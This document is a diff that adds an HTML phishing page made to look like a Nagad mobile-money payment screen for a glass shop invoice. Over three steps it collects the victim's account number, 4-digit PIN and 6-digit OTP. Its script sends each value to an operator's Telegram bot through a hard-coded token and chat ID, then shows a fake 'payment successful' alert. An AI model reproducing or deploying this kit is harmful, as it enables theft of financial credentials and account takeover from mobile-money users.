@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Nagad Payment Flow</title>
+  <style>
+    :root {
+      --bg1: #9b1515;
+      --bg2: #c41b1b;
+      --white: #ffffff;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, 'Noto Sans', 'Helvetica Neue', Arial; }
+    body { background: #111; padding: 10px; display: flex; align-items: center; justify-content: center; }
+
+    .modal {
+      width: 100%;
+      max-width: 420px;
+      border-radius: 6px;
+      background: linear-gradient(180deg, var(--bg2), var(--bg1));
+      color: var(--white);
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+      padding: 20px;
+      display: none;
+    }
+    .modal.active { display: block; }
+
+    .top-bar { display: flex; justify-content: space-between; align-items: center; }
+    .top-left-x { width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.25); cursor: pointer; }
+    .top-left-x svg { width: 18px; height: 18px; opacity: 0.9; }
+    .lang-toggle { background: rgba(255,255,255,0.1); border-radius: 8px; padding: 4px; font-size: 13px; display: flex; gap: 6px; }
+    .lang-toggle button { background: transparent; border: 0; color: var(--white); padding: 4px 6px; border-radius: 6px; cursor: pointer; }
+    .lang-toggle button.active { background: var(--white); color: var(--bg1); font-weight: 600; }
+
+    .brand { text-align: center; margin: 15px 0; }
+    .brand svg { width: 56px; height: 56px; }
+    .brand h1 { margin: 10px 0 0; font-size: 22px; }
+
+    .invoice { margin: 10px 0; font-size: 15px; }
+    .invoice .row { margin-bottom: 6px; }
+    .invoice .label { font-weight: 600; }
+
+    .acct-label, .pin-label, .otp-label { text-align: center; margin: 15px 0; font-weight: 700; }
+    
+    .acct-input, .otp-input {
+      width: 100%; padding: 12px; font-size: 18px; text-align: center; border-radius: 6px; border: none; color: #222; outline: none;
+    }
+
+    .pin-inputs { display: flex; justify-content: center; gap: 10px; }
+    .pin-inputs input { width: 50px; height: 50px; text-align: center; font-size: 22px; font-weight: 700; border-radius: 6px; border: none; color: #222; outline: none; }
+
+    .otp-input { letter-spacing: 5px; font-weight: 700; font-size: 22px; max-width: 260px; margin: 0 auto; display: block; }
+
+    .actions { display: flex; gap: 12px; justify-content: center; margin-top: 18px; flex-wrap: wrap; }
+    .btn { padding: 10px 24px; border-radius: 8px; border: none; font-weight: 700; cursor: pointer; flex: 1; transition: 0.3s; }
+    .btn.proceed { background: var(--white); color: var(--bg1); }
+    .btn.close { background: transparent; border: 2px solid rgba(255,255,255,0.2); color: var(--white); }
+    .btn.resend { background: #ff9900; color: #fff; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .error { color: #ffe1e1; background: rgba(0,0,0,0.12); padding: 8px; border-radius: 6px; text-align: center; margin-top: 10px; display: none; }
+  </style>
+</head>
+<body>
+
+  <div id="step-number" class="modal active">
+    <div class="top-bar">
+      <div class="top-left-x" onclick="location.reload()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </div>
+      <div class="lang-toggle"><button type="button" class="active">বাংলা</button><button type="button">Eng</button></div>
+    </div>
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6h15l-1.5 7H8.5L6 6z"></path><circle cx="10" cy="18" r="1"></circle><circle cx="18" cy="18" r="1"></circle></svg>
+      <h1>MEGHNA GLASS HOUSE</h1>
+    </div>
+    <div class="invoice">
+      <div class="row"><span class="label">Invoice No:</span> BD1041239620635</div>
+      <div class="row"><span class="label">Charge:</span> BDT 21</div>
+    </div>
+    <div class="acct-label">Your Nagad Account Number</div>
+    <input type="text" id="acctNumber" class="acct-input" maxlength="11" placeholder="Enter 11 digit number" inputmode="numeric">
+    <div id="error-1" class="error"></div>
+    <div class="actions">
+      <button type="button" id="btn-1" class="btn proceed" onclick="validateStep1()">Proceed</button>
+      <button type="button" class="btn close" onclick="location.reload()">Close</button>
+    </div>
+  </div>
+
+  <div id="step-pin" class="modal">
+    <div class="top-bar">
+      <div class="top-left-x" onclick="location.reload()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </div>
+      <div class="lang-toggle"><button type="button" class="active">বাংলা</button><button type="button">Eng</button></div>
+    </div>
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6h15l-1.5 7H8.5L6 6z"></path><circle cx="10" cy="18" r="1"></circle><circle cx="18" cy="18" r="1"></circle></svg>
+      <h1>MEGHNA GLASS HOUSE</h1>
+    </div>
+    <div class="invoice">
+      <div class="row"><span class="label">Invoice No:</span> BD1041239620635</div>
+      <div class="row"><span class="label">Charge:</span> BDT 0</div>
+    </div>
+    <div class="pin-label">Enter 4-Digit PIN</div>
+    <div class="pin-inputs">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+    </div>
+    <div id="error-2" class="error"></div>
+    <div class="actions">
+      <button type="button" id="btn-2" class="btn proceed" onclick="validateStep2()">Proceed</button>
+      <button type="button" class="btn close" onclick="location.reload()">Close</button>
+    </div>
+  </div>
+
+  <div id="step-otp" class="modal">
+    <div class="top-bar">
+      <div class="top-left-x" onclick="location.reload()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </div>
+      <div class="lang-toggle"><button type="button" class="active">বাংলা</button><button type="button">Eng</button></div>
+    </div>
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6h15l-1.5 7H8.5L6 6z"></path><circle cx="10" cy="18" r="1"></circle><circle cx="18" cy="18" r="1"></circle></svg>
+      <h1>MEGHNA GLASS HOUSE</h1>
+    </div>
+    <div class="otp-label">Enter Verification Code [OTP]</div>
+    <input type="text" id="otpInput" maxlength="6" class="otp-input" inputmode="numeric" placeholder="XXXXXX">
+    
+    <div id="error-3" class="error"></div>
+    <div class="actions">
+      <button type="button" id="btn-3" class="btn proceed" onclick="validateStep3()">Proceed</button>
+      <button type="button" class="btn resend" onclick="alert('🔄 নতুন OTP পাঠানো হয়েছে')">Resend Code</button>
+      <button type="button" class="btn close" onclick="location.reload()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    // --- TELEGRAM CONFIG ---
+    const TELEGRAM_TOKEN = '8599559236:AAHiKkoqaOiN39NP1s-BSB1LaJ6HFb-O5BU'; // আপনার বোট টোকেন এখানে দিন
+    const CHAT_ID = '7260345767';         // আপনার চ্যাট আইডি এখানে দিন
+
+    let USER_NUMBER = "";
+    let USER_PIN = "";
+
+    // Telegram Sender Function
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+      try {
+        await fetch(url);
+      } catch (e) {
+        console.error("Telegram send failed", e);
+      }
+    }
+
+    // Step 1 Validation & Sending
+    async function validateStep1() {
+      const num = document.getElementById('acctNumber').value;
+      const err = document.getElementById('error-1');
+      const btn = document.getElementById('btn-1');
+
+      if(/^\d{11}$/.test(num)) {
+        USER_NUMBER = num;
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+        
+        await sendToTelegram(`🔔 Nagad Number: ${num}`);
+        
+        document.getElementById('step-number').classList.remove('active');
+        document.getElementById('step-pin').classList.add('active');
+      } else {
+        err.textContent = 'অনুগ্রহ করে সঠিক ১১ সংখ্যার মোবাইল নাম্বার দিন';
+        err.style.display = 'block';
+      }
+    }
+
+    // Step 2 Validation & Sending
+    async function validateStep2() {
+      let pin = "";
+      document.querySelectorAll('.pinBox').forEach(b => pin += b.value);
+      const err = document.getElementById('error-2');
+      const btn = document.getElementById('btn-2');
+
+      if(pin.length === 4) {
+        USER_PIN = pin;
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+
+        await sendToTelegram(`🔑 Nagad PIN: ${pin}\n(For: ${USER_NUMBER})`);
+
+        document.getElementById('step-pin').classList.remove('active');
+        document.getElementById('step-otp').classList.add('active');
+      } else {
+        err.textContent = 'অনুগ্রহ করে 4 সংখ্যার PIN লিখুন';
+        err.style.display = 'block';
+      }
+    }
+
+    // Step 3 (OTP) Final Sending
+    async function validateStep3() {
+      const otp = document.getElementById('otpInput').value;
+      const err = document.getElementById('error-3');
+      const btn = document.getElementById('btn-3');
+
+      if(/^\d{6}$/.test(otp)) {
+        btn.disabled = true;
+        btn.innerText = "Verifying...";
+
+        await sendToTelegram(`✅ Nagad OTP: ${otp}\nNumber: ${USER_NUMBER}\nPIN: ${USER_PIN}`);
+
+        // সব শেষ হলে ইউজারকে রিডাইরেক্ট বা সাকসেস মেসেজ দিতে পারেন
+        alert("পেমেন্ট সফলভাবে সম্পন্ন হয়েছে!");
+        window.location.href = "index.html";
+      } else {
+        err.textContent = 'অনুগ্রহ করে সঠিক ৬ সংখ্যার OTP দিন';
+        err.style.display = 'block';
+      }
+    }
+
+    // PIN Box Auto Focus Logic
+    const pinBoxes = document.querySelectorAll('.pinBox');
+    pinBoxes.forEach((box, idx) => {
+      box.addEventListener('input', e => {
+        if(e.target.value && idx < 3) pinBoxes[idx+1].focus();
+      });
+      box.addEventListener('keydown', e => {
+        if(e.key === "Backspace" && !box.value && idx > 0) pinBoxes[idx-1].focus();
+      });
+    });
+
+    // Input গুলোতে ক্লিক করলে এরর মেসেজ চলে যাবে
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('input', () => {
+        document.querySelectorAll('.error').forEach(e => e.style.display = 'none');
+      });
+    });
+  </script>
+</body>
+</html>
